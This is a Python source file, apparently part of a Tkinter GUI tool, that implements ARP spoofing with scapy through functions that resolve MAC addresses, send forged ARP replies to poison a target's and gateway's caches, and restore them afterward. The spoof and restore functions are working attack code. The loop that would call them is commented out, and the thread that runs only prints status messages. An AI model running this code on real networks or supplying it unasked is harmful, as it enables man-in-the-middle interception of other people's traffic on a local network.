import scapy.all as scapy
import time
import threading

from tkinter import *
from ProgramSetup.Footer import Footer

def startArp(terminalContentFrame, wiresharkContentFrame, errorOutputContentFrame, targetIp, defaultGatewayIp) :

    global is_running, arp_th

    arp_th = threading.Thread(target = arpLoop)
    is_running = False

    terminalLabel = Label(terminalContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=480)
    wiresharkLabel = Label(wiresharkContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=480)
    errorOutputLabel = Label(errorOutputContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=480)
    '''
    try :
        sentPacketsCount = 0
        for i in range(1,3,1) :
            
            spoof(targetIp, defaultGatewayIp)
            spoof(defaultGatewayIp, targetIp)
            sentPacketsCount += 2
            print("Running..")
            time.sleep(2)
    except KeyboardInterrupt:
        print("Stopping Process")
        restore(defaultGatewayIp, targetIp)
        restore(targetIp, defaultGatewayIp)
        print("Process Stopped!")'''
    
    runArpAttack()
    
    terminalLabel.pack(anchor = NW)
    errorOutputLabel.pack(anchor = NW)

def stopArp() :
    global arp_th, is_running
    try:
        is_running = False
        arp_th.join(0)
        arp_th = None
    except (AttributeError, RuntimeError):
        pass

def runArpAttack():
    global is_running
    is_running = True
    #arp_th = threading.Thread(target = arpLoop)
    arp_th.start()

def arpLoop():
    count = 3
    while is_running == True and count != 0:
        print("Running..")
        time.sleep(2)
        count -= 1
        
    print("STOPPED..")

def get_mac(targetIp):
    arp_request = scapy.ARP(pdst = targetIp)
    broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout = 5, verbose = False)[0]

    return answered_list[0][1].hwsrc

def spoof(targetIp, defaultGatewayIp):
    packet = scapy.ARP(op = 2, pdst = targetIp, 
                     hwdst = get_mac(targetIp), 
                               psrc = defaultGatewayIp)
  
    scapy.send(packet, verbose = False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op = 2, pdst = destination_ip, 
                             hwdst = destination_mac, 
                psrc = source_ip, hwsrc = source_mac)
  
    scapy.send(packet, verbose = False)
